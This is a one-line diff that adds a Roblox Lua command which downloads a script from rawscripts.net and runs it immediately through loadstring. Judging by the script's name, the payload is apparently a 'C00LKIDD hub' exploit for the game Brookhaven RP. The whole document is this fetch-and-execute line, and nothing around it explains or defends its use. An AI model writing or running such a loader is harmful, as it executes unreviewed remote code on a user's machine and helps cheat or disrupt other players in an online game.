@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-C00LKIDD-HUB-atualizado-74293"))()
